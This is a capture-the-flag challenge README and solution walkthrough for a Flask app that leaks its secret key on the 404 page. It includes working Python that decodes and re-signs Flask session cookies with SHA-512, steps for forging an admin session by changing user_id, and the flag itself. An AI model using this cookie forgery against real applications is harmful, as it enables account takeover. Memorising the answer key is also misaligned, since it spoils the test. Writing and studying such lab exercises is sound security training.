# Unchanged App Secrets

This is an application which is mostly boilerplate. It was initially intended to provide competitors with a copy of the application which they could stand up locally, however it turns out all you have to do in that case is stand up the application and copy the session cookie over. The challenge now requires at least figuring out how flask sessions work (or just finding this gist: https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe)

# How to Solve

There are a few steps to solving this challenge.

1. Navigate to the 404 page, there you will find `MYFLASKAPP_SECRET Value: secret-key`.
1. Realize that the hint about flask being 512x better than rails means that the digest_method (on the next step) is sha512 instead of sha1 which is the default. That is the reason for the `BoilerplateSecureCookieSessionInterface` class below.
1. Paste the following into a python shell with flask installed (most of the code below is from the gist, with the `BoilerplateSecureCookieSessionInterface` as described above):

		from flask.sessions import SecureCookieSessionInterface
		from itsdangerous import URLSafeTimedSerializer
		import hashlib

		class BoilerplateSecureCookieSessionInterface(SecureCookieSessionInterface):
		    digest_method = staticmethod(hashlib.sha512)

		class SimpleSecureCookieSessionInterface(BoilerplateSecureCookieSessionInterface):
			# Override method
			# Take secret_key instead of an instance of a Flask app
			def get_signing_serializer(self, secret_key):
				if not secret_key:
					return None
				signer_kwargs = dict(
					key_derivation=self.key_derivation,
					digest_method=self.digest_method
				)
				return URLSafeTimedSerializer(secret_key, salt=self.salt,
				                              serializer=self.serializer,
				                              signer_kwargs=signer_kwargs)

		def decodeFlaskCookie(secret_key, cookieValue):
			sscsi = SimpleSecureCookieSessionInterface()
			signingSerializer = sscsi.get_signing_serializer(secret_key)
			return signingSerializer.loads(cookieValue)

		# Keep in mind that flask uses unicode strings for the
		# dictionary keys
		def encodeFlaskCookie(secret_key, cookieDict):
			sscsi = SimpleSecureCookieSessionInterface()
			signingSerializer = sscsi.get_signing_serializer(secret_key)
			return signingSerializer.dumps(cookieDict)

1. Create a new account on the application and copy your session value.
1. Back on the python shell, run `decodeFlaskCookie('secret-key', <your session token here>)`, it will look something like `decodeFlaskCookie('secret-key', '.eJwlj0lqAzEQAP-isw_qRa2WP2PUGwmBBGbsU8jfPZAHFFX12x515PnR7s_jlbf2-Ix2bzxiFVJsojkNo8ci50IOdSZw1GRfIuEx0aQHFUYo1N5Bg3FowFoBkWTsCi6Vm5W4L92KMzMGWi2pXbTBtnSSMaHPEXBp2635edTj-fOV31ePMHWvyxu9bOFAZkUz24Vp2qcPkYTki3udefxPQPt7A_JOP5o.DbkblQ.zCMssdyQeSQaNfbN0REwFpGDlD8p2jgzOamNlbGXrKppm5zBkEr_s4Ao54Ay6JgTMP7BqmTOR0T8pwhDPbB1Cw')`.
1. The result of the previous command will look something like `{'_fresh': True, '_id': '45d9f23da3377b2d0d93c4f24d8c431c28e4c966dcd72b60d3f2dd81faad354258d199d1de3b4c81c6fea4834098a827eed52bf96faf3a1ba6036571075d13da', 'csrf_token': '6430cf1c2d0fb92524482bbbaf2eb807c566e1e4', 'user_id': '2'}`
1. Manipulate the `user_id` in the response to be `1`, allowing you to impersonate the admin user.
1. Run `encodeFlaskCookie('secret-key', {'_fresh': True, '_id': '45d9f23da3377b2d0d93c4f24d8c431c28e4c966dcd72b60d3f2dd81faad354258d199d1de3b4c81c6fea4834098a827eed52bf96faf3a1ba6036571075d13da', 'csrf_token': '6430cf1c2d0fb92524482bbbaf2eb807c566e1e4', 'user_id': '1'})` in order to generate a new session token.
1. Replace the session token in the browser with your new session token and refresh the page.
1. The flag will appear.

# Flag

MCA{give_me_my_session_back!}